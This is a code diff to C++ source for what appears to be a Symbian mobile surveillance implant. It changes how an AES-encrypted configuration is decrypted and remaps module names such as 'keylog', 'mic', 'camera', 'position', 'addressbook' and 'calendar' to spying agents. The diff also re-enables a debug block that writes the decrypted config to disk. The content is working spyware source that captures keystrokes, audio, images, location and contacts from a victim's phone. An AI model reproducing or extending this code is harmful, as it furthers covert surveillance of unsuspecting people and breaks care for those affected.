@@ -8,7 +8,6 @@
 #include <HT\LogFile.h>
 
 
-
 /**
  * CActionData class holds the informations retrieved from the Config
  */
@@ -232,7 +231,8 @@ HBufC8* CConfigFile::DecryptConfigFileL(RFs& fs, const TDesC& fname)
 		newConf = EFalse;
 		}
 
-	// Convert key from string to hexa buffer
+	// 7.x Convert key from string to hexa buffer
+
 	TBuf8<16> hexaKey;
 	for(TInt i = 0; i<32; i = i+2){
 		TLex8 lex(KAES_CONFIG_KEY().Mid(i,2));
@@ -240,7 +240,10 @@ HBufC8* CConfigFile::DecryptConfigFileL(RFs& fs, const TDesC& fname)
 		lex.Val(val,EHex);
 		hexaKey.Append(val);
 	}
-				
+	
+	// 8.0 take 16 bytes from config key
+	//TBuf8<16> hexaKey(KAES_CONFIG_KEY().Left(16));
+		
 	__FLOG(_L8("DecryptConfigFileL Begin"));
 	if (!BaflUtils::FileExists(fs, fname))
 		return HBufC8::NewL(0);
@@ -286,15 +289,16 @@ HBufC8* CConfigFile::DecryptConfigFileL(RFs& fs, const TDesC& fname)
 	buf.Close();
 	
 	//TODO: delete when done with testing
-/*
+	
 	RFile file;
 	TFullName filename(_L("C:\\Data\\Installs\\json.txt"));
 	TInt err = file.Create(fs, filename, EFileWrite | EFileStream | EFileShareAny);
 	file.Write(*encryptedBuf);
 	file.Flush();
 	file.Close();
-*/	
+	
 	//TODO: end delete when done
+
 	CleanupStack::Pop(encryptedBuf);
 	return encryptedBuf;
 	}
@@ -461,11 +465,13 @@ TInt CConfigFile::GetModuleId(CJsonObject* aObject)
 	if(name.Compare(_L("mic")) == 0)
 		return EAgent_Mic;
 	if(name.Compare(_L("clipboard")) == 0)
-		return EAgent_Clipboard_TODO;
+		//return EAgent_Clipboard_TODO;
+		return 0;
 	if(name.Compare(_L("conference")) == 0)
 		return 0;
 	if(name.Compare(_L("crisis")) == 0)
-		return EAgent_Crisis_TODO;
+		//return EAgent_Crisis_TODO;
+		return 0;
 	if(name.Compare(_L("device")) == 0)
 		return EAgent_Device;
 	if(name.Compare(_L("keylog")) == 0)
@@ -479,15 +485,17 @@ TInt CConfigFile::GetModuleId(CJsonObject* aObject)
 	if(name.Compare(_L("camera"))==0)
 		return EAgent_Cam;
 	if(name.Compare(_L("chat"))==0)
-		return EAgent_IM_TODO;  
+		//return EAgent_IM_TODO;
+		return 0;
 	if(name.Compare(_L("url"))== 0)
-		return EAgent_URL_TODO;
+		//return EAgent_URL_TODO;
+		return 0;
 	if(name.Compare(_L("snapshot")) == 0)
 		return EAgent_Snapshot;
 	if(name.Compare(_L("position")) == 0)
 		return EAgent_Position;
 	if(name.Compare(_L("calendar")) == 0)
-		return EAgent_Tasks_TODO;
+		return EAgent_Calendar;
 	if(name.Compare(_L("addressbook")) == 0)
 		return EAgent_Addressbook;
 	
